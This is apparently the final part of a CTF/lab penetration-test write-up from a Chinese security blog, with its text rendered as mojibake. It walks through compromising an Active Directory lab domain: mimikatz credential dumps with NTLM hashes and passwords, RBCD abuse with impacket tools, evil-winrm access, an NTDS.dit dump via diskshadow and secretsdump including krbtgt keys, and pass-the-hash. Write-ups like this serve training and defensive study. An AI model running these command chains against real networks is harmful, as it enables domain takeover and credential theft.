<p>ä¼  mimikatz <span class="hexo-wm">ğ˜€â€3ğ¯ğ˜¦ğ§â€¢â€‹ğ˜´ğ˜ªï»¿ğ’•ğ˜¦â€‹â€</span>è·å¾—åŸŸå†…ç”¨æˆ·çš„å“ˆå¸Œ</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">mimikatz.exe <span class="token string">"log"</span> <span class="token string">"privilege::debug"</span> <span class="token string">"sekurlsa::logonpasswords"</span> <span class="token string">"exit"</span>

Authentication Id <span class="token builtin class-name">:</span> <span class="token number">0</span> <span class="token punctuation">;</span> <span class="token number">996</span> <span class="token punctuation">(</span>00000000:000003e4<span class="token punctuation">)</span>
Session           <span class="token builtin class-name">:</span> Service from <span class="token number">0</span>
User Name         <span class="token builtin class-name">:</span> FPSRVIIS03$
Domain            <span class="token builtin class-name">:</span> FPCORP
Logon Server      <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span>
SID               <span class="token builtin class-name">:</span> S-1-5-20
        msv <span class="token builtin class-name">:</span>
         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary
         * Username <span class="token builtin class-name">:</span> FPSRVIIS03$
         * Domain   <span class="token builtin class-name">:</span> FPCORP
         * NTLM     <span class="token builtin class-name">:</span> 17e2732c1dfa96062534bff91bcf7941
         * SHA1     <span class="token builtin class-name">:</span> 440ca472380560b7fa975b9cddafb39c7e94e5eb
         * DPAPI    <span class="token builtin class-name">:</span> 440ca472380560b7fa975b9cddafb39c
        tspkg <span class="token builtin class-name">:</span>
        wdigest <span class="token builtin class-name">:</span>
         * Username <span class="token builtin class-name">:</span> FPSRVIIS03$
         * Domain   <span class="token builtin class-name">:</span> FPCORP
         * Password <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span>
        kerberos <span class="token builtin class-name">:</span>
         * Username <span class="token builtin class-name">:</span> fpsrviis03$
         * Domain   <span class="token builtin class-name">:</span> FPCORP.INT
         * Password <span class="token builtin class-name">:</span> f7 0e <span class="token number">99</span> 4c <span class="token number">14</span> eb ff <span class="token number">14</span> <span class="token number">83</span> d6 e5 f1 0d <span class="token number">53</span> <span class="token number">16</span> <span class="token number">83</span> 1f 3c 5f <span class="token number">79</span> 7f b8 <span class="token number">30</span> <span class="token number">28</span> <span class="token number">79</span> b8 e3 eb 7b c1 <span class="token number">97</span> af e4 07 <span class="token function">dc</span> 8b cf <span class="token number">30</span> a5 7f 0e <span class="token number">67</span> fc bb b4 2a d1 a2 <span class="token number">17</span> <span class="token number">19</span> ea <span class="token number">21</span> 8f <span class="token number">24</span> <span class="token number">74</span> b8 ff c1 <span class="token number">28</span> b5 f1 <span class="token number">22</span> bf 6b <span class="token number">85</span> <span class="token number">69</span> <span class="token number">98</span> <span class="token number">36</span> b0 c7 e1 2a <span class="token number">80</span> fa <span class="token number">35</span> d9 3b cf b7 05 8e 8d b4 6a <span class="token number">19</span> <span class="token number">15</span> <span class="token number">97</span> a1 aa <span class="token number">53</span> da 5c 3b <span class="token number">68</span> <span class="token number">65</span> 2d <span class="token number">45</span> <span class="token number">31</span> <span class="token number">54</span> 00 <span class="token number">17</span> e6 <span class="token number">69</span> 4c <span class="token number">97</span> <span class="token number">40</span> <span class="token number">88</span> 04 <span class="token number">65</span> 4a <span class="token number">16</span> cb <span class="token number">20</span> 2d 6d 4f 0c <span class="token number">19</span> 09 <span class="token number">76</span> e5 <span class="token number">74</span> d4 <span class="token number">96</span> <span class="token number">53</span> f2 <span class="token number">23</span> <span class="token number">74</span> <span class="token number">84</span> <span class="token number">49</span> bb 0f b7 09 <span class="token number">54</span> d7 c1 5a <span class="token number">73</span> 6f <span class="token number">48</span> fc <span class="token number">58</span> 6b e5 08 6c 5a <span class="token number">46</span> <span class="token function">bc</span> fe <span class="token number">98</span> <span class="token number">46</span> <span class="token number">65</span> 3d b6 ed <span class="token number">77</span> e8 0b 7e 9b <span class="token function">dd</span> <span class="token number">65</span> <span class="token number">20</span> 8b <span class="token number">90</span> ae 5a <span class="token number">68</span> c3 <span class="token number">85</span> <span class="token number">22</span> e8 <span class="token number">82</span> d1 a1 8d ef 7e de db 07 <span class="token number">87</span> 0b 09 <span class="token number">57</span> 5c 1e c1 d3 d9 ae a3 <span class="token number">77</span> <span class="token number">11</span> e1 d2 e9 d7 fe <span class="token number">53</span> <span class="token number">26</span> 8b fd <span class="token number">77</span> <span class="token number">54</span> cc a1 9f 2e fc a9 <span class="token number">55</span> <span class="token function">df</span> 7c 6b a0 8a ce 8d 2e <span class="token number">25</span> <span class="token builtin class-name">cd</span> 3e <span class="token number">12</span> <span class="token number">52</span> <span class="token number">57</span> 3a a4 d4 c8 <span class="token number">77</span> 8c 7c d1 <span class="token number">14</span> <span class="token number">13</span> 6b <span class="token number">12</span>
        ssp <span class="token builtin class-name">:</span>
        credman <span class="token builtin class-name">:</span>
        cloudap <span class="token builtin class-name">:</span></code></pre>


<p>ä½¿ç”¨ SharpHound <span class="hexo-wm">sâ€â€â‘¶ğ¯ğğ˜¯â€¤â€Œâ€‹êœ±â…ˆâ€Œğ­ğ˜¦â€Œ</span>æ”¶é›†åŸŸå†…ä¿¡æ¯ï¼š</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">GodPotato.exe <span class="token parameter variable">-cmd</span> <span class="token string">"C:\Windows\Temp\SharpHound-v1.1.1\SharpHound.exe -c all --outputdirectory C:\Windows\Temp"</span></code></pre>

<p>å¯¼å…¥åˆ° Bloo<span class="hexo-wm">ğ˜´â€‹â€â‘¶ğ˜·â„®ğ˜¯â€¤â€‹ğ˜€iï»¿â€ğ­eï»¿â€Œ</span>dHound ä¸­åˆ†æï¼š<br><img src="image-14.png" alt="image-14.png"></p>
<h3 id="6-FPSRVIIS03-2"><a href="#6-FPSRVIIS03-2" class="headerlink" title="6. FPSRVIIS03-2"></a>6. FPSRVIIS03-2</h3><p>æŸ¥çœ‹ FPSRVIIS03 ä¸­ Web æœåŠ¡çš„æ—¥å¿—å¯ä»¥å‘ç°ï¼ŒFPSRVIIS03-2 <span class="hexo-wm">ğ˜€â€‹Â³â…´ğğ§Â·â€â€Œğ’”ğ˜ªâ€ï½”ğâ€‹</span>æ¯éš”2åˆ†é’Ÿå°±ä¼šæ‹‰å– VisualStudioSetup.exeï¼Œç»“åˆ FPSRVIIS03 ä¸­çš„å…¬å‘ŠçŒœæµ‹å…¶ä¼šæ‰§è¡Œè¯¥ exe</p>
<p>FPSRVIIS03-2 ä¸­å¼€å¯äº† Windows Defenderï¼Œç›´æ¥ä¸Šå…æ€é©¬ï¼Œ<span class="hexo-wm">sâ€â€â‘¶ğ˜·ğğ˜¯.ï»¿ï»¿Ñ•â…ˆâ€Œğ’•ï½…ï»¿</span>ä» Adminstrator æ¡Œé¢è·å¾— flag</p>
<p>bypassUAC åä¼  mimikatz æ”¶é›† Hashï¼š</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">mimikatz.exe <span class="token string">"log"</span> <span class="token string">"privilege::debug"</span> <span class="token string">"sekurlsa::logonpasswords"</span> <span class="token string">"exit"</span>

Authentication Id <span class="token builtin class-name">:</span> <span class="token number">0</span> <span class="token punctuation">;</span> <span class="token number">128183</span> <span class="token punctuation">(</span>00000000:0001f4b7<span class="token punctuation">)</span>
Session           <span class="token builtin class-name">:</span> Service from <span class="token number">0</span>
User Name         <span class="token builtin class-name">:</span> liu654
Domain            <span class="token builtin class-name">:</span> FPCORP
Logon Server      <span class="token builtin class-name">:</span> FPSRVAD01
SID               <span class="token builtin class-name">:</span> S-1-5-21-3225782379-1150096479-4236096888-1138
        msv <span class="token builtin class-name">:</span>
         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary
         * Username <span class="token builtin class-name">:</span> liu654
         * Domain   <span class="token builtin class-name">:</span> FPCORP
         * NTLM     <span class="token builtin class-name">:</span> 9d0692eade0a6529acb5f0b122ae8763
         * SHA1     <span class="token builtin class-name">:</span> ab55a10d983dfb60e0f633175af8e6e939bfb020
         * DPAPI    <span class="token builtin class-name">:</span> 769347cc561870207141327479e8be4e
        tspkg <span class="token builtin class-name">:</span>
        wdigest <span class="token builtin class-name">:</span>
         * Username <span class="token builtin class-name">:</span> liu654
         * Domain   <span class="token builtin class-name">:</span> FPCORP
         * Password <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span>
        kerberos <span class="token builtin class-name">:</span>
         * Username <span class="token builtin class-name">:</span> liu654
         * Domain   <span class="token builtin class-name">:</span> FPCORP.INT
         * Password <span class="token builtin class-name">:</span> p1Uf^yko@+yHS
        ssp <span class="token builtin class-name">:</span>
        credman <span class="token builtin class-name">:</span>
        cloudap <span class="token builtin class-name">:</span></code></pre>

<p>æ‹¿åˆ° <code>FPCORP.INT\liu654</code> çš„å¯†ç  <code>p1Uf^yko@+yHS</code></p>
<h3 id="7-FPSRVFS02"><a href="#7-FPSRVFS02" class="headerlink" title="7. FPSRVFS02"></a>7. FPSRVFS02</h3><p>ç”±äº <code>LIU654@FPCORP.INT</code> å¯¹ <code>FPSRVFS02.FPCORP.INT</code> å…·æœ‰ GenericWrite <span class="hexo-wm">êœ±â€‹Â³ğ’—â„¯ğ˜¯ï¼â€‹â€‹ğ’”iï»¿â€Œtï½…ï»¿ï»¿</span>æƒé™ï¼Œå¯ä»¥æ‰“ RBCD</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">proxychains addcomputer.py fpcorp.int/liu654:<span class="token string">'p1Uf^yko@+yHS'</span> -dc-ip <span class="token number">172.22</span>.20.25 -dc-host fpcorp.int -computer-name <span class="token string">'TEST$'</span> -computer-pass <span class="token string">'P@ssw0rd'</span>

proxychains rbcd.py fpcorp.int/liu654:<span class="token string">'p1Uf^yko@+yHS'</span> -dc-ip <span class="token number">172.22</span>.20.25 <span class="token parameter variable">-action</span> <span class="token function">write</span> -delegate-to <span class="token string">'FPSRVFS02$'</span> -delegate-from <span class="token string">'TEST$'</span>

proxychains getST.py fpcorp.int/<span class="token string">'TEST$'</span><span class="token builtin class-name">:</span><span class="token string">'P@ssw0rd'</span> <span class="token parameter variable">-spn</span> cifs/FPSRVFS02.FPCORP.INT <span class="token parameter variable">-impersonate</span> Administrator -dc-ip <span class="token number">172.22</span>.20.25

<span class="token function">sudo</span> <span class="token function">nano</span> /etc/hosts
+++
<span class="token number">172.22</span>.20.32    FPSRVFS02.FPCORP.INT
+++

<span class="token builtin class-name">export</span> <span class="token assign-left variable">KRB5CCNAME</span><span class="token operator">=</span>Administrator@cifs_FPSRVFS02.FPCORP.INT@FPCORP.INT.ccache

proxychains wmiexec.py Administrator@FPSRVFS02.FPCORP.INT <span class="token parameter variable">-k</span> -no-pass -dc-ip <span class="token number">172.22</span>.20.25 <span class="token parameter variable">-codec</span><span class="token operator">=</span>gbk</code></pre>

<p>ç”±äº FPSRVFS02 æœ‰ <code>SVC_BKPADMIN@FPCORP.INT</code> çš„ sessionï¼Œ<span class="hexo-wm">ğ˜€â€Œâ‘¶ğ¯ï½…ğ˜¯âˆ™â€‹ğ¬iâ€Œâ€ï½”eâ€Œâ€</span>ä¼  mimikatz æ”¶é›† Hashï¼š</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">mimikatz.exe <span class="token string">"log"</span> <span class="token string">"privilege::debug"</span> <span class="token string">"sekurlsa::logonpasswords"</span> <span class="token string">"exit"</span>

Authentication Id <span class="token builtin class-name">:</span> <span class="token number">0</span> <span class="token punctuation">;</span> <span class="token number">95966</span> <span class="token punctuation">(</span>00000000:000176de<span class="token punctuation">)</span>
Session           <span class="token builtin class-name">:</span> Service from <span class="token number">0</span>
User Name         <span class="token builtin class-name">:</span> svc_bkpadmin
Domain            <span class="token builtin class-name">:</span> FPCORP
Logon Server      <span class="token builtin class-name">:</span> FPSRVAD01
SID               <span class="token builtin class-name">:</span> S-1-5-21-3225782379-1150096479-4236096888-1176
        msv <span class="token builtin class-name">:</span>
         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary
         * Username <span class="token builtin class-name">:</span> svc_bkpadmin
         * Domain   <span class="token builtin class-name">:</span> FPCORP
         * NTLM     <span class="token builtin class-name">:</span> f2f3e075ca082813f0d8191f947b0e01
         * SHA1     <span class="token builtin class-name">:</span> 272514fca4ff5d1dbde31190d29158693c788333
         * DPAPI    <span class="token builtin class-name">:</span> f5b7f440b2e68c1592f2dd9d7d8e0466
        tspkg <span class="token builtin class-name">:</span>
        wdigest <span class="token builtin class-name">:</span>
         * Username <span class="token builtin class-name">:</span> svc_bkpadmin
         * Domain   <span class="token builtin class-name">:</span> FPCORP
         * Password <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span>
        kerberos <span class="token builtin class-name">:</span>
         * Username <span class="token builtin class-name">:</span> svc_bkpadmin
         * Domain   <span class="token builtin class-name">:</span> FPCORP.INT
         * Password <span class="token builtin class-name">:</span> kzmR^lBw1<span class="token operator">!</span>8BL
        ssp <span class="token builtin class-name">:</span>
        credman <span class="token builtin class-name">:</span>
        cloudap <span class="token builtin class-name">:</span></code></pre>

<p>æ‹¿åˆ° <code>FPCORP.INT\svc_bkpadmin</code> çš„å¯†ç  <code>kzmR^lBw1!8BL</code></p>
<h3 id="8-FPSRVAD01"><a href="#8-FPSRVAD01" class="headerlink" title="8. FPSRVAD01"></a>8. FPSRVAD01</h3><p>ç”±äº <code>SVC_BKPADMIN@FPCORP.INT</code> å¯¹ <code>FPSRVAD01.FPCORP.INT</code> å…·æœ‰ <code>CanPSRemote</code> æƒé™ï¼Œå¯ä»¥ä½¿ç”¨ <span class="hexo-wm">êœ±â€Â³vâ„®ğ’â€¢â€ŒÑ•â…ˆâ€tğ˜¦ï»¿ï»¿</span>evil-winrm ç™»å½•æ§åˆ¶ <code>FPSRVAD01.FPCORP.INT</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">proxychains evil-winrm <span class="token parameter variable">-i</span> <span class="token number">172.22</span>.20.25 <span class="token parameter variable">-u</span> svc_bkpadmin <span class="token parameter variable">-p</span> <span class="token string">"kzmR^lBw1\!8BL"</span></code></pre>

<p>è¿›å»ä¹‹åå‘ç°æ²¡æœ‰æƒé™è¯» <span class="hexo-wm">sï»¿â‘¶ğ’—ğğ§ï¼ï»¿ğ˜€ğ˜ªâ€Œï»¿ğ­ğï»¿â€‹</span>flagï¼Œçœ‹ä¸€ä¸‹ç‰¹æƒä¿¡æ¯ï¼š</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">whoami</span> /priv

ç‰¹æƒä¿¡æ¯
----------------------

ç‰¹æƒå                        æè¿°             çŠ¶æ€
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
SeMachineAccountPrivilege     å°†å·¥ä½œç«™æ·»åŠ åˆ°åŸŸ å·²å¯ç”¨
SeBackupPrivilege             å¤‡ä»½æ–‡ä»¶å’Œç›®å½•   å·²å¯ç”¨
SeRestorePrivilege            è¿˜åŸæ–‡ä»¶å’Œç›®å½•   å·²å¯ç”¨
SeShutdownPrivilege           å…³é—­ç³»ç»Ÿ         å·²å¯ç”¨
SeChangeNotifyPrivilege       ç»•è¿‡éå†æ£€æŸ¥     å·²å¯ç”¨
SeIncreaseWorkingSetPrivilege å¢åŠ è¿›ç¨‹å·¥ä½œé›†   å·²å¯ç”¨</code></pre>

<p>æœ‰ SeBackupPrivilege ç‰¹æƒï¼Œ<span class="hexo-wm">ğ˜€ï»¿â€‹3ğ¯ï½…ï½â€¤â€â€Ñ•â…ˆâ€â€Œï½”ğ˜¦â€</span>ä½¿ç”¨å·å½±å¤åˆ¶å¯¼å‡º Hashï¼š</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"set context persistent nowriters"</span> <span class="token operator">|</span> out-file ./diskshadow.txt <span class="token parameter variable">-encoding</span> ascii
<span class="token builtin class-name">echo</span> <span class="token string">"add volume c: alias temp"</span> <span class="token operator">|</span> out-file ./diskshadow.txt <span class="token parameter variable">-encoding</span> ascii <span class="token parameter variable">-append</span>
<span class="token builtin class-name">echo</span> <span class="token string">"create"</span> <span class="token operator">|</span> out-file ./diskshadow.txt <span class="token parameter variable">-encoding</span> ascii <span class="token parameter variable">-append</span>
<span class="token builtin class-name">echo</span> <span class="token string">"expose %temp% z:"</span> <span class="token operator">|</span> out-file ./diskshadow.txt <span class="token parameter variable">-encoding</span> ascii <span class="token parameter variable">-append</span>
diskshadow.exe /s c:<span class="token punctuation">\</span>temp<span class="token punctuation">\</span>diskshadow.txt

robocopy /b z:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>config <span class="token builtin class-name">.</span> system
RoboCopy /b z:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>ntds <span class="token builtin class-name">.</span> ntds.dit
secretsdump.py <span class="token parameter variable">-ntds</span> ntds.dit <span class="token parameter variable">-system</span> system <span class="token builtin class-name">local</span>

Administrator:500:aad3b435b51404eeaad3b435b51404ee:972ffc4a036603066d388a1e28b4f583:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
FPSRVAD01$:1000:aad3b435b51404eeaad3b435b51404ee:52b489dc1e61fc2ef34152c382982faf:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b70e6f2681a7677a5bb97f5f38e9a5e6:::
FPITWKS101$:1103:aad3b435b51404eeaad3b435b51404ee:84bb2e34c8df3ff887870909976068ba:::
FPSRVFS02$:1104:aad3b435b51404eeaad3b435b51404ee:498d1edeac2f6994d49faba3358b48bd:::
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:df24c180d344f70f1ecb4384d5310dcf73de5bdb49347ae6f93ff1aa157a808f
Administrator:aes128-cts-hmac-sha1-96:f9cfc900b462330f6450ed88990d478b
Administrator:des-cbc-md5:ec325e9b2cfdfe6d
FPSRVAD01$:aes256-cts-hmac-sha1-96:622dbab2d042ddef7456f42f33d168adce091f679d79a7d1987eb952fc4a58fb
FPSRVAD01$:aes128-cts-hmac-sha1-96:a3240e9771fcb708c2f3694221397034
FPSRVAD01$:des-cbc-md5:2f76d30e19d33231
krbtgt:aes256-cts-hmac-sha1-96:a509693becfe3315a89e8877f2d2fbbb25609b6b99ab7691168ddaf7e102314c
krbtgt:aes128-cts-hmac-sha1-96:9fcb039ba0afa32f4294212e3f286d96
krbtgt:des-cbc-md5:5431f1439e291f10
FPITWKS101$:aes256-cts-hmac-sha1-96:92c5faadd7bf017c94035f476b013d7f89d584c65d21e2a5273b162327549f84
FPITWKS101$:aes128-cts-hmac-sha1-96:4b24dfd5ff95402c2d743cf710a63fc5
FPITWKS101$:des-cbc-md5:3df1c2ad1ac164b0
FPSRVFS02$:aes256-cts-hmac-sha1-96:695c0f85a867e2d4db59dcb8afe6aca84c3cd324eb963f0a067f228711e762aa
FPSRVFS02$:aes128-cts-hmac-sha1-96:202b2f21f606ca7a6edff8d3d24b2181
FPSRVFS02$:des-cbc-md5:a131b6c2f8673d98
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Cleaning up<span class="token punctuation">..</span>.</code></pre>

<pre class="language-bash" data-language="bash"><code class="language-bash">proxychains wmiexec.py administrator@172.22.20.25 <span class="token parameter variable">-hashes</span> <span class="token string">"aad3b435b51404eeaad3b435b51404ee:972ffc4a036603066d388a1e28b4f583"</span></code></pre></body></html>
        </div>
        
          <div class="prev-or-next">
            <div class="post-foot-next">
              
                <a href="../2025-l3hctf-writeup/" target="_self">
                  <i class="iconfont icon-chevronleft"></i>
                  <span>ä¸Šä¸€é¡µ</span>
                </a>
              
            </div>
            <div class="post-foot-prev">
              
            </div>
          </div>
        
      </div>
    </div>
    
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="catalog-zoom">
      <div class="title">ç›®å½•</div>
      <div class="catalog-content">
        
          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Build"><span class="toc-text">Build</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%9F%A5%E8%AF%86%E5%BA%93%E6%9E%84%E5%BB%BA%E4%BB%BB%E5%8A%A1"><span class="toc-text">1. çŸ¥è¯†åº“æ„å»ºä»»åŠ¡</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-%E7%BD%91%E7%BB%9C%E7%A1%AC%E4%BB%B6%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E"><span class="toc-text">1.1 ç½‘ç»œç¡¬ä»¶è®¾å¤‡æ¼æ´</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E"><span class="toc-text">1.2 å¤§æ¨¡å‹å®‰å…¨æ¼æ´</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B%E9%A1%B9%E8%AE%BE%E8%AE%A1%E4%BB%BB%E5%8A%A1"><span class="toc-text">2. å®‰å…¨æ£€æµ‹é¡¹è®¾è®¡ä»»åŠ¡</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AWDP"><span class="toc-text">AWDP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-security-rasp"><span class="toc-text">1. security_rasp</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Fix"><span class="toc-text">Fix</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-rbac"><span class="toc-text">2. rbac</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-text">é¢˜ç›®åˆ†æ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Fix-1"><span class="toc-text">Fix</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Break"><span class="toc-text">Break</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F%E6%89%93%E6%B3%95"><span class="toc-text">éé¢„æœŸæ‰“æ³•</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%A2%84%E6%9C%9F%E6%89%93%E6%B3%95"><span class="toc-text">é¢„æœŸæ‰“æ³•</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-ota"><span class="toc-text">3. ota</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-1"><span class="toc-text">é¢˜ç›®åˆ†æ</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-Spring-%E6%A1%86%E6%9E%B6%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E"><span class="toc-text">1. Spring æ¡†æ¶ç›®å½•éå†æ¼æ´</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-h2-database-JDBC-RCE"><span class="toc-text">2. h2 database JDBC RCE</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-JWT-Token-%E4%BC%AA%E9%80%A0"><span class="toc-text">3. JWT Token ä¼ªé€ </span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Fix-2"><span class="toc-text">Fix</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Break-1"><span class="toc-text">Break</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pentest"><span class="toc-text">Pentest</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-web01"><span class="toc-text">1. web01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-web02"><span class="toc-text">2. web02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-database"><span class="toc-text">3. database</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-ollama"><span class="toc-text">4. ollama</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-FPSRVIIS03"><span class="toc-text">5. FPSRVIIS03</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-FPSRVIIS03-2"><span class="toc-text">6. FPSRVIIS03-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-FPSRVFS02"><span class="toc-text">7. FPSRVFS02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-FPSRVAD01"><span class="toc-text">8. FPSRVAD01</span></a></li></ol></li></ol>
        
      </div>
    </div>
  </div>

  
<script src="../../js/catalog.js"></script>




    
  </div>
  <script>
    (() => {
      function compensate() {
        const bodyBox = document.querySelector('.zoom-wrap');
        if (bodyBox) {
          const gapY = bodyBox.offsetHeight - bodyBox.getBoundingClientRect().height;
          bodyBox.style.marginBottom = `-${gapY}px`;
        }

        const catBox = document.querySelector('.catalog-zoom');
        if (catBox) {
          const rect = catBox.getBoundingClientRect();
          const gapX = catBox.offsetWidth  - rect.width;
          const gapY = catBox.offsetHeight - rect.height;

          const list = catBox.querySelector('.catalog-content');
          if (list) {
            const orig = list.dataset.origHeight
                      ? parseFloat(list.dataset.origHeight)
                      : parseFloat(getComputedStyle(list).height);
            list.dataset.origHeight = orig;
            list.style.height       = (orig + gapY) + 'px';
          }

          catBox.style.marginRight  = `-${gapX}px`;
          catBox.style.marginBottom = `-${gapY}px`;
        }
      }

      function hookImages(root = document) {
        root.querySelectorAll('img').forEach(img => {
          if (img.dataset._scaledFix) return;
          img.dataset._scaledFix = 1;
          img.addEventListener('load', compensate, {once: true});
        });
      }

      addEventListener('DOMContentLoaded', () => {
        compensate();
        hookImages();
      });

      addEventListener('resize', compensate);

      const observer = new MutationObserver(muts => {
        muts.forEach(m => {
          m.addedNodes.forEach(n => {
            if (n.nodeType !== 1) return;
            if (n.tagName === 'IMG') hookImages(n.parentNode);
            else hookImages(n);
          });
        });
      });

      const wrap = document.querySelector('.zoom-wrap');
      if (wrap) observer.observe(wrap, {childList: true, subtree: true});
    })();
  </script>


        
<div class="footer">
  <div class="social">
    <ul>
      
        <li>
          
              <a title="github" href="https://github.com/security-s3ven">
                <i class="iconfont icon-github"></i>
              </a>
              
        </li>
        
    </ul>
  </div>
  
    
    <div class="footer-more">
      
        <a href="https://github.com/security-s3ven">Copyright Â© 2023-2026 s3ven</a>
        
    </div>
  
    
    <div class="footer-more">
      
        <a href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
        
    </div>
  
  
</div>

      </div>

      <div class="tools-bar">
        <div class="back-to-top tools-bar-item hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="../../js/backtotop.js"></script>



        
  <div class="search-icon tools-bar-item" id="search-icon">
    <a href="javascript: void(0)">
      <i class="iconfont icon-search"></i>
    </a>
  </div>

  <div class="search-overlay hidden">
    <div class="search-content" tabindex="0">
      <div class="search-title">
        <span class="search-icon-input">
          <a href="javascript: void(0)">
            <i class="iconfont icon-search"></i>
          </a>
        </span>
        
          <input type="text" class="search-input" id="search-input" placeholder="æœç´¢...">
        
        <span class="search-close-icon" id="search-close-icon">
          <a href="javascript: void(0)">
            <i class="iconfont icon-close"></i>
          </a>
        </span>
      </div>
      <div class="search-result" id="search-result"></div>
    </div>
  </div>

  <script type="text/javascript">
    var inputArea = document.querySelector("#search-input")
    var searchOverlayArea = document.querySelector(".search-overlay")

    inputArea.onclick = function() {
      getSearchFile()
      this.onclick = null
    }

    inputArea.onkeydown = function() {
      if(event.keyCode == 13)
        return false
    }

    function openOrHideSearchContent() {
      let isHidden = searchOverlayArea.classList.contains('hidden')
      if (isHidden) {
        searchOverlayArea.classList.remove('hidden')
        document.body.classList.add('hidden')
        // inputArea.focus()
      } else {
        searchOverlayArea.classList.add('hidden')
        document.body.classList.remove('hidden')
      }
    }

    function blurSearchContent(e) {
      if (e.target === searchOverlayArea) {
        openOrHideSearchContent()
      }
    }

    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
    searchOverlayArea.addEventListener("click", blurSearchContent, false)

    var searchFunc = function (path, search_id, content_id) {
      'use strict';
      var $input = document.getElementById(search_id);
      var $resultContent = document.getElementById(content_id);
      $resultContent.innerHTML = "<ul><span class='local-search-empty'>é¦–æ¬¡æœç´¢ï¼Œæ­£åœ¨è½½å…¥ç´¢å¼•æ–‡ä»¶ï¼Œè¯·ç¨åâ€¦â€¦<span></ul>";
      $.ajax({
        // 0x01. load xml file
        url: path,
        dataType: "xml",
        success: function (xmlResponse) {
          // 0x02. parse xml file
          var datas = $("entry", xmlResponse).map(function () {
            return {
              title: $("title", this).text(),
              content: $("content", this).text(),
              url: $("url", this).text()
            };
          }).get();
          $resultContent.innerHTML = "";

